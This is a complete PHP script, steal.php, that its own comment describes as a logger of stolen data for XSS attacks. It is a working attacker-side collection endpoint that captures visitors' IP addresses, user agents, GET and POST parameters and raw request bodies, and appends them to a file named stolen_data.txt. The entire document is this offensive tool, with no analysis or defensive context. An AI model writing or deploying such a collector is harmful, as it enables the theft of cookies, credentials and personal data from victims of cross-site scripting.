<?php
// steal.php - Log stolen data for XSS attacks

// Log all GET and POST data
$data = [];
$data['time'] = date('Y-m-d H:i:s');
$data['ip'] = $_SERVER['REMOTE_ADDR'];
$data['user_agent'] = $_SERVER['HTTP_USER_AGENT'];

if (!empty($_GET)) {
    $data['GET'] = $_GET;
}
if (!empty($_POST)) {
    $data['POST'] = $_POST;
}

// Read any raw input (for JSON payloads)
$raw = file_get_contents('php://input');
if (!empty($raw)) {
    $data['raw'] = $raw;
}

// Format the log entry
$log_entry = "========================================\n";
$log_entry .= "Time: " . $data['time'] . "\n";
$log_entry .= "IP: " . $data['ip'] . "\n";
$log_entry .= "User-Agent: " . $data['user_agent'] . "\n";

if (isset($data['GET'])) {
    $log_entry .= "GET Data:\n" . print_r($data['GET'], true) . "\n";
}
if (isset($data['POST'])) {
    $log_entry .= "POST Data:\n" . print_r($data['POST'], true) . "\n";
}
if (isset($data['raw'])) {
    $log_entry .= "Raw Data:\n" . $data['raw'] . "\n";
}

$log_entry .= "========================================\n\n";

// Save to file
file_put_contents('stolen_data.txt', $log_entry, FILE_APPEND);

// Return a response (silent)
echo "✅ Data received";
?>